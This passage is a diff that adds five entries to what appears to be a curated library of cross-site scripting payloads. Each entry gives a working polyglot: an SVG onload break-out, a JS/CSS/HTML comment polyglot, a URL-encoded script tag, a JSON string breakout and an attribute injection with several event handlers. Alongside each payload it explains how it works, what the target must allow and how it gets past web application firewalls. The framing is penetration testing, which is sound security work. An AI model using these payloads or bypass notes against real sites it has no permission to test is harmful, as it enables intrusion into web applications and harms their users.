+    date_added: '2024-01-01'
+    last_updated: '2024-01-01'
+  - id: xss-poly-011
+    title: HTML5 context-agnostic polyglot (onerror + svg)
+    payload_string: '''"><svg onload=alert(1)//</svg>'
+    how_it_works: 'This short polyglot works across multiple HTML contexts by breaking out of attribute values (using both
+      single and double quotes), then injecting an SVG onload handler. The trailing double-slash treats any remaining attribute
+      value as a URL comment, preventing parser errors. It functions in reflected GET parameters, form fields, and URL fragments.
+      The SVG onload event fires as soon as the element is inserted into the DOM, making this a reliable cross-context probe
+      payload. Its brevity makes it useful for WAF bypass testing where character limits apply.
+
+      '
+    prerequisites:
+    - Attacker controls parameter reflected in HTML attribute or tag context
+    - Browser supports SVG inline elements
+    waf_bypass_notes: SVG onload bypasses rules blocking onerror/onclick handlers
+    severity_context: CVSS 6.1 – context-agnostic reflected XSS polyglot
+    cve_refs: []
+    tags:
+    - polyglot
+    - svg
+    - onload
+    - attribute-escape
+    - short
+    date_added: '2024-01-01'
+    last_updated: '2024-01-01'
+  - id: xss-poly-012
+    title: 'Jaff polyglot: valid JS, CSS, and HTML'
+    payload_string: /*</style></script><img src=/ onerror=alert(1)>*/
+    how_it_works: 'This polyglot is simultaneously valid as a JavaScript block comment, a CSS block comment, and an HTML element
+      that triggers XSS. When placed in a JavaScript context, the parser ignores everything inside the /* ... */ comment.
+      In a CSS context it similarly acts as a comment block. However, if the output is placed in an HTML context (for example,
+      when server-side rendering inserts the value into a page), the img tag''s onerror fires. The multi-language validity
+      makes it an effective probe for applications that pre-process content through multiple languages before final HTML rendering.
+      A single payload tests JS injection, CSS injection, and HTML injection simultaneously.
+
+      '
+    prerequisites:
+    - 'Input appears in at least one of: HTML, JavaScript, or CSS context'
+    - No context-specific encoding applied to both comment delimiters
+    waf_bypass_notes: JS/CSS comment wrapper confuses content-type-aware WAF engines
+    severity_context: CVSS 6.1 – multi-language context-agnostic XSS polyglot
+    cve_refs: []
+    tags:
+    - polyglot
+    - javascript-comment
+    - css-comment
+    - multi-context
+    - jaff
+    date_added: '2024-01-01'
+    last_updated: '2024-01-01'
+  - id: xss-poly-013
+    title: URL-encoded polyglot for query parameter injection
+    payload_string: '%22%3E%3Cscript%3Ealert(document.domain)%3C/script%3E'
+    how_it_works: 'URL percent-encoding of the payload ''<script>alert(document.domain)</script>'' allows it to bypass WAF
+      rules that scan for literal angle brackets and script keywords in query strings. When the server URL-decodes the parameter
+      before reflecting it in HTML without encoding, the decoded payload injects a script tag. The document.domain output
+      confirms the exploited origin, useful for demonstrating the impact to customers. This encoding-bypass technique is fundamental
+      to reflected XSS testing on applications that apply WAF filtering before URL decoding but skip HTML encoding on output.
+
+      '
+    prerequisites:
+    - Server URL-decodes query parameters before HTML-encoding for output
+    - WAF inspects URL-encoded form but does not re-check after decoding
+    waf_bypass_notes: Double URL-encoding or mixed encoding may be needed against aggressive WAFs
+    severity_context: CVSS 6.1 – URL-encoded reflected XSS in query parameter
+    cve_refs: []
+    tags:
+    - polyglot
+    - url-encoding
+    - query-parameter
+    - waf-bypass
+    - reflected
+    date_added: '2024-01-01'
+    last_updated: '2024-01-01'
+  - id: xss-poly-014
+    title: JSON context polyglot breaking out of string and object
+    payload_string: '","x":"<script>alert(1)</script>","'
+    how_it_works: 'When user input is embedded directly into a JSON object that is later passed to innerHTML or eval(), this
+      polyglot closes the current JSON string and object field, then injects a new key containing a script tag. The outer
+      application code receives the malformed JSON and may either ignore the parse error and use eval(), or pass the raw string
+      to innerHTML. In either case the script tag executes. This technique is particularly relevant for applications that
+      inline JSON configuration objects in HTML using server-side templating, where the JSON value is not properly escaped
+      for the HTML context.
+
+      '
+    prerequisites:
+    - User input embedded inside an inline JSON object in HTML
+    - JSON object passed to eval() or innerHTML without re-encoding
+    waf_bypass_notes: JSON string escapes confuse WAF parsers expecting standard HTML payloads
+    severity_context: CVSS 6.1 – JSON string context breakout to XSS
+    cve_refs: []
+    tags:
+    - polyglot
+    - json
+    - string-breakout
+    - inline-data
+    - dom-xss
+    date_added: '2024-01-01'
+    last_updated: '2024-01-01'
+  - id: xss-poly-015
+    title: Event handler polyglot for multiple HTML attribute contexts
+    payload_string: x onmouseover=alert(1) onfocus=alert(1) onclick=alert(1) x=
+    how_it_works: 'This polyglot injects multiple event handlers simultaneously by crafting input that, when inserted into
+      an HTML attribute value or tag context, adds three independent event handlers. The trailing x= fragment starts a new
+      attribute without a value, consuming whatever the server appends next and preventing HTML parse errors. The three event
+      handlers (mouseover, focus, click) maximise the chance of execution across different page interaction patterns. This
+      is used as a comprehensive attribute-injection probe during penetration tests because it tests multiple browser event
+      triggers with one request, reducing the number of test cases needed to confirm XSS exploitability.
+
+      '
+    prerequisites:
+    - Input appears inside an HTML tag attribute value that breaks into tag context
+    - Browser renders the resulting element
+    waf_bypass_notes: Multiple handler names spread across non-blocked event types
+    severity_context: CVSS 6.1 – multi-handler attribute injection polyglot
+    cve_refs: []
+    tags:
+    - polyglot
+    - event-handler
+    - attribute-injection
+    - mouseover
+    - onfocus
+    date_added: '2024-01-01'
+    last_updated: '2024-01-01'
